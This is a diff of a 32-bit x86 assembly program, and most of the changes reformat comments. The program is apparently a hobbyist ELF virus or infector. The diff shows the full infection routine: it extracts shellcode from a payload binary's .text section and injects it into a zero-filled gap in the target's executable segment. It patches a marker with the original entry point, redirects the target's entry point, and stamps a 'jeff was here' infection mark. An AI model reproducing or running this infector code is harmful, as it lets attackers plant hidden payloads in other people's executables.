@@ -65,25 +65,25 @@ section .text
 	global _start
 
 _start:
-	cmp dword[esp], 3 	; argc
+	cmp dword[esp], 3 		; argc
 	je good_arg_count
 
 	push usage
 	push usage_len
 	call print
 
-	push ERR_BAD_USAGE	; the return value
+	push ERR_BAD_USAGE		; the return value
 	jmp exit
 
 good_arg_count:
 	;; saving one file name for later
-	mov eax, [esp + 0x8]	; pivot name
+	mov eax, [esp + 0x8]		; pivot name
 	mov [pivot_name], eax
 
-	mov eax, [esp + 0x0c]	; elf name
+	mov eax, [esp + 0x0c]		; elf name
 
 	;; opening files
-	push eax		; elf name
+	push eax			; elf name
 	push O_RDONLY
 	call open
 
@@ -103,19 +103,19 @@ next_open:
 open_err:
 	push bad_open
 	push bad_open_len
-	call print		; "couldn't open file!" ; TODO: might make it "$FILE couldn't be opened"
+	call print			; "couldn't open file!" ; TODO: might make it "$FILE couldn't be opened"
 
-	push ERR_BAD_OPEN	; the return value
+	push ERR_BAD_OPEN		; the return value
 	;; deciding which file to clean
 	mov eax, [elf_fd]
 	test eax, eax
-	js exit			; no files have been opened
-	jmp close_elf		; elf was opened but pivot wasn't
+	js exit				; no files have been opened
+	jmp close_elf			; elf was opened but pivot wasn't
 
 getting_sizes:
-	push eax		; pivot_fd
+	push eax			; pivot_fd
 	call get_file_size
-	test eax, eax		; pivot_size < 0 ?
+	test eax, eax			; pivot_size < 0 ?
 	jle file_size_err
 	mov [pivot_size], eax
 
@@ -123,7 +123,7 @@ next_size:
 	push dword[elf_fd]
 	call get_file_size
 	mov [elf_size], eax
-	test eax, eax		; elf_size < 0 ?
+	test eax, eax			; elf_size < 0 ?
 	jg mapping
 
 file_size_err:
@@ -142,22 +142,22 @@ file_size_err:
 an_empty_file:
 	push empty_file
 	push empty_file_len
-	call print		; "empty file!"
-	push ERR_EMPTY_FILE	; the return value
-	jmp close_files		; cleaning resources
+	call print			; "empty file!"
+	push ERR_EMPTY_FILE		; the return value
+	jmp close_files			; cleaning resources
 
 failed_fstat:
-	push ERR_BAD_FSTAT	; the return value
-	jmp close_files		; cleaning resources
+	push ERR_BAD_FSTAT		; the return value
+	jmp close_files			; cleaning resources
 
 mapping:
-	push eax 		; elf_size
+	push eax 			; elf_size
 	push MAP_PRIVATE
 	push dword[elf_fd]
 	call mmap
 	mov [elf_data], eax
 
-	cmp eax, -1		; this can't be replaced with a test eax, eax
+	cmp eax, -1			; this can't be replaced with a test eax, eax
 	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
 	; we know if we should unmap them before exiting, for that I'll use ebx
 	; pivot wasn't mapped -> ebx = 1
@@ -173,7 +173,7 @@ next_map:
 	call mmap
 	mov [pivot_data], eax
 
-	cmp eax, -1		; this can't be replaced with test eax, eax
+	cmp eax, -1			; this can't be replaced with test eax, eax
 	jne after_mapping
 	mov ebx, 1
 
@@ -181,19 +181,19 @@ mmap_err:
 	push ERR_BAD_MMAP
 	; ebx has a hint of what file failed to map
 	test ebx, ebx
-	je close_files		; elf failed -> nothing was mapped -> close files and exit
-	jmp unmap_elf		; pivot failed -> elf was mapped -> unmap elf, close files then exit
+	je close_files			; elf failed -> nothing was mapped -> close files and exit
+	jmp unmap_elf			; pivot failed -> elf was mapped -> unmap elf, close files then exit
 
 after_mapping:
 	; next we have to check if both the target file and the payload are 32 but, if not then we exit
 	push dword[pivot_data]
-	call is_target_elf	; returns -1 for false, 0 for true
-	test eax, eax		; is this a good file ?
+	call is_target_elf		; returns -1 for false, 0 for true
+	test eax, eax			; is this a good file ?
 	jne arch_err
 
 	push dword[elf_data]
 	call is_target_elf
-	test eax, eax		; is this a good file ?
+	test eax, eax			; is this a good file ?
 	je checking_infection
 
 arch_err:
@@ -226,7 +226,7 @@ checking_infection:
 	push infected_len
 	call print
 
-	push ERR_INFECTED	; the return value
+	push ERR_INFECTED		; the return value
 	jmp clean
 
 extract_shellcode:
@@ -234,10 +234,10 @@ extract_shellcode:
 	mov eax, [elf_data]
 	push eax
 	push shellcode_size
-	call find_shell 	; returns a pointer to the .text sections, and initializes
-				; the shellcode_size variable
+	call find_shell 		; returns a pointer to the .text sections, and initializes
+					; the shellcode_size variable
 
-	test eax, eax		; shellcode == NULL ?
+	test eax, eax			; shellcode == NULL ?
 	jne next
 	push ERR_NO_SHELL
 	jmp clean
@@ -264,9 +264,9 @@ segments:
 	;; parse the segment headers and find a gap in the executable one
 	; getting a pointer to the segment base
 	mov eax, [pivot_data]
-	mov ebx, [eax + e_phoff] ; we need eax to stay the same for a while ; TODO : optimize this line
+	mov ebx, [eax + e_phoff] 	; we need eax to stay the same for a while ; TODO : optimize this line
 	add ebx, eax
-	sub ebx, Elf32_Phdr_size ; pointer to the program headers's base - 1 * Elf32_Phdr_size
+	sub ebx, Elf32_Phdr_size 	; pointer to the program headers's base - 1 * Elf32_Phdr_size
 
 	; getting p_phunm
 	mov cx, word[eax + e_phnum]
@@ -330,23 +330,22 @@ next2:
 	; entry point value
 	; ebx should still have an Elf32_Phdr pointer to the target segment and
 	mov edx, [ebx + p_vaddr]
-	sub eax, [pivot_data]	; get the gap offset in file
-	add eax, edx		; the the new entry point value (aka where the shellcode is gonna be in memorry)
-	mov ebx, [pivot_data]	; TODO : might use a lea here
+	sub eax, [pivot_data]		; get the gap offset in file
+	add eax, edx			; the the new entry point (e.g where the shell is goning to be in memory)
+	mov ebx, [pivot_data]		; TODO : might use a lea here
 	add ebx, e_entry
-	mov [ebx], eax		; patching the entry point
-	;mov [pivot_data + e_entry], eax ; patch the entry point
+	mov [ebx], eax			; patching the entry point
 	;;
 
 leaving_mark:
 	push marking
 	push marking_len
-	call print		;"leaving a mark ..."
+	call print			;"leaving a mark ..."
 
 	mov eax, [pivot_data]
-	add eax, EI_PAD		; pointing at EI_PAD
+	add eax, EI_PAD			; pointing at EI_PAD
 	push eax
-	push mark		; the "jeff was here" thingy
+	push mark			; the "jeff was here" thingy
 	call strlen
 	push eax
 	call copy_data
@@ -359,9 +358,9 @@ leaving_mark:
 
 	push enjoy
 	push enjoy_len
-	call print		; "file has been infected"
+	call print			; "file has been infected"
 
-	push SUCCESS		; the return value
+	push SUCCESS			; the return value
 
 clean: 	; we have to preserve the state of the stack after each call since the return value was the last thing
 	; pushed on the stack
@@ -402,9 +401,9 @@ open:	; int open(char *file, int flags);
 	push ecx
 	;
 
-	mov eax, 0x5		; sys_open
-	mov ebx, [ebp + 0xc]	; file name
-	mov ecx, [ebp + 0x8]	; flags
+	mov eax, 0x5			; sys_open
+	mov ebx, [ebp + 0xc]		; file name
+	mov ecx, [ebp + 0x8]		; flags
 	int 0x80
 
 	;restoring used registers
@@ -474,7 +473,7 @@ copy_data:	; void *copy_data(void *dst, void *src, DWORD size) ; basically a mem
 
 	mov edi, [ebp + 0x10]
 	mov esi, [ebp + 0x0c]
-	mov ecx, [ebp + 0x8]	; size
+	mov ecx, [ebp + 0x8]		; size
 
 copying_loop:
 	dec ecx
@@ -546,33 +545,33 @@ method2:	; checking the in-segment 0-blocks
 	mov edx, [edx + p_filesz]	; segment size
 
 parsing_data:
-	inc ecx			; ++i
-	cmp ecx, edx		; i > seg_size ?
+	inc ecx				; ++i
+	cmp ecx, edx			; i > seg_size ?
 	je no_gap
 
-	cmp byte[ebx + ecx], 0	; segment[i] == 0 ?
+	cmp byte[ebx + ecx], 0		; segment[i] == 0 ?
 	jne check_and_reset
-	inc eax			; ++ gap_size
+	inc eax				; ++ gap_size
 	jmp parsing_data
 
 check_and_reset:
-	cmp eax, [ebp + 0x08]	; current_size => shellcode_size ?
+	cmp eax, [ebp + 0x08]		; current_size => shellcode_size ?
 	jl reset_counter
 	; we have a valid gap @ segment + i - current_size
-	sub ecx, eax	; i - current_size
-	add ebx, ecx	; segment + i - current_size
-	mov eax, ebx	; the value to return
+	sub ecx, eax			; i - current_size
+	add ebx, ecx			; segment + i - current_size
+	mov eax, ebx			; the value to return
 	jmp found_gap
 
 reset_counter:
-	xor eax, eax 	; current gap size = 0
+	xor eax, eax 			; current gap size = 0
 	jmp parsing_data
 
 no_gap:
 	push no_gap_found
 	push no_gap_found_len
 	call print
-	xor eax, eax ; gap = NULL
+	xor eax, eax	 		; gap = NULL
 	add esp, 8
 	jmp ret_gap
 
@@ -602,33 +601,33 @@ patch_jump_point:	;bool patch_jump_point(char *shellcode, size_t size, DWORD mar
 	push ecx
 	push edx
 	;
-	mov eax, [ebp + 0x14] 	; shellcode
-	mov ecx, [ebp + 0x10]	; size
-	mov edx, [ebp + 0xc] 	; the marker which is 0x69696969 in this case
+	mov eax, [ebp + 0x14]	 	; shellcode
+	mov ecx, [ebp + 0x10]		; size
+	mov edx, [ebp + 0xc] 		; the marker which is 0x69696969 in this case
 	; the combo eax + ecx points at the last byte in the shellcode string (\0) but we need it to point 
 	; at the last DWORD
 	; so -1 byte for the null byte and -3 to point at the last valid DWORD
-	sub ecx, 4		; TODO : this might should be 5 (debug on steroids!!)
+	sub ecx, 4
 
 marker_loop:	; will be searching from the end to start as that is where the marker is likely to be
 	cmp dword[eax + ecx], edx
 	je found_marker
 
 	dec ecx
-	jns marker_loop 	; buff[0] is a valid DWORD as well
+	jns marker_loop 		; buff[0] is a valid DWORD as well
 
 no_mark_found:
 	push no_marker
 	push no_marker_len
 	call print
 	add esp, 8
-	mov eax, -1		; returns FALSE
+	mov eax, -1			; returns FALSE
 	jmp ret_patch
 
 found_marker:
-	mov ebx, [ebp + 0x8]	; the original entry point
-	mov [eax + ecx], ebx 	; patching the shellcode return address
-	xor eax, eax 		; returns TRUE
+	mov ebx, [ebp + 0x8]		; the original entry point
+	mov [eax + ecx], ebx 		; patching the shellcode return address
+	xor eax, eax 			; returns TRUE
 
 ret_patch:
 	;restoring saved register
@@ -655,11 +654,11 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	push esi
 	push edi
 
-	mov ebx, [ebp + 0xc] ; this will stay in ebx for the rest of the function so we don't keep accessing memorry
+	mov ebx, [ebp + 0xc] 		; this will stay in ebx for the rest of the function so we don't keep accessing memorry
 
 	;;taking care of the generic section pointer (@ ebp - 4)
 	mov edi, [ebx + e_shoff]
-	add edi, ebx	; for later
+	add edi, ebx			; for later
 	;;
 
 
@@ -667,14 +666,14 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ax, word[ebx + e_shstrndx]
 	movzx eax, ax
 	mov ecx, Elf32_Shdr_size
-	mul cl			; eax now has the string table file offset in file, and edx has the sections 
-				; base in memorry
+	mul cl				; eax now has the string table file offset in file, and edx has 
+					; the sections base in memorry
 	add eax, edi
 	; now we have a pointer to the string table section, but we want the actuall offset of the section
 	; in memorry
 	mov edx, [eax + sh_offset]
-	add edx, ebx		; from now on, edx will have the pointer to the string index table, we're gonna
-				; use this later
+	add edx, ebx			; from now on, edx will have the pointer to the string index table, 
+					; we're gonna use this later
 
 	;;taking care of the section_count variable (@ ebp - 0xc)
 	mov ax, [ebx + e_shnum]
@@ -682,7 +681,7 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 
 	; parsing the sections and returning the address of .text
 	xor ecx, ecx
-	push target_section	; argument to strcmp
+	push target_section		; argument to strcmp
 
 parsing_loop:
 	;get the sh_name and add it to edx (the string table section)
@@ -690,7 +689,7 @@ parsing_loop:
 	add esi, edx
 	push esi
 	call strcmp
-	add esp, 4		; so we don't have to keep track of the stack 
+	add esp, 4			; so we don't have to keep track of the stack 
 	;do some error checking
 	test eax, eax
 	je found_text_section
@@ -699,11 +698,11 @@ parsing_loop:
 	;;
 
 	inc ecx
-	cmp cx, word[ebp - 2] 	; e_shnum
+	cmp cx, word[ebp - 2] 		; e_shnum
 	jne parsing_loop
 
 no_text_section:
-	xor eax, eax 		; text = NULL
+	xor eax, eax 			; text = NULL
 	push no_text
 	push no_text_len
 	call print
@@ -739,7 +738,7 @@ ret_text_section:
 unmap:	; void unmap(void *data, size_t size);
 	push ebp
 	mov ebp, esp
-	;saving registers ; might not be necessary
+	;saving registers
 	push eax
 	push ebx
 	push ecx
@@ -805,7 +804,7 @@ get_file_size:	; size_t get_file_size(int fd);
 
 	push bad_stat
 	push bad_stat_len
-	call print		; "couldn't stat file!"
+	call print			; "couldn't stat file!"
 	mov eax, -1
 	add esp, 8
 
@@ -861,7 +860,7 @@ strlen_loop:
 	test al, al
 	jne strlen_loop
 
-	mov eax, ecx	; the return value
+	mov eax, ecx			; the return value
 	;restoring registers
 	pop esi
 	pop ecx
@@ -895,16 +894,16 @@ good_elf_ptr:
 
 	push bad_32_bit_elf
 	push bad_32_bit_elf_len
-	call print		; "file is not 32 bit"
+	call print			; "file is not 32 bit"
 	add esp, 8
-	mov eax, -1		; the return value
+	mov eax, -1			; the return value
 	jmp ret_arch
 
 is_32_bit:
 	inc eax
 	cmp byte[eax], LITTLE
 	jne bad_little_endian
-	xor eax, eax		; the return value
+	xor eax, eax			; the return value
 	jmp ret_arch
 
 bad_little_endian:
@@ -912,7 +911,7 @@ bad_little_endian:
 	push bad_l_endian_len
 	call print
 	add esp, 8
-	mov eax, -1		; the return value
+	mov eax, -1			; the return value
 
 ret_arch:
 	pop ebp
@@ -933,7 +932,7 @@ strcmp: ; size_t strcmp(char *known_buff, char *unkown_buff)
 	mov ecx, eax
 	mov eax, [ebp + 0x0c]
 	mov ebx, [ebp + 0x8]
-	dec ecx	; an array index
+	dec ecx				; an array index
 
 cmp_loop:
 	; edx will be used to hold the actual bytes
@@ -947,7 +946,7 @@ cmp_loop:
 	jmp same_buffers
 
 diff_buffers:
-	mov eax, -1 ; returns FALSE
+	mov eax, -1			; returns FALSE
 	jmp end
 
 same_buffers:
